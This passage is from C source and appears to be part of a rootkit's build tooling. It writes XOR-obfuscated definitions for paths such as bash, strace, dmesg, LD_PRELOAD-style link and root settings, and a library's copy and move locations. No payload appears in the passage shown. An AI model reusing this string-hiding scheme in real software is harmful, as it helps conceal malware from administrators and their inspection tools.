	xor_dump(DMESG_BIN2, fd);
	write(fd, DEF_STRACE_BIN,      strlen(DEF_STRACE_BIN));
	xor_dump(STRACE_BIN, fd);
	write(fd, DEF_BASH_BIN,        strlen(DEF_BASH_BIN));
	xor_dump(BASH_BIN, fd);
	write(fd, DEF_BASH,            strlen(DEF_BASH));
	xor_dump(BASH, fd);
	write(fd, DEF_SQUID3_BIN,      strlen(DEF_SQUID3_BIN));
	xor_dump(SQUID3_BIN, fd);

	write(fd, DEF_LD_LINK,         strlen(DEF_LD_LINK));
	xor_dump(LD_LINK, fd);
	write(fd, DEF_LD_ROOT,         strlen(DEF_LD_ROOT));
	xor_dump(LD_ROOT, fd);
	write(fd, DEF_LIB_DSX,         strlen(DEF_LIB_DSX));
	xor_dump(LIB_DSX, fd);
	write(fd, DEF_CP_LIB_DSX,      strlen(DEF_CP_LIB_DSX));
	xor_dump(CP_LIB_DSX, fd);
	write(fd, DEF_MV_LIB_DSX,      strlen(DEF_MV_LIB_DSX));
	xor_dump(MV_LIB_DSX, fd);

	write(fd, DEF_UPGRADE,      strlen(DEF_UPGRADE));
	xor_dump(UPGRADE, fd);


	return 0;
}
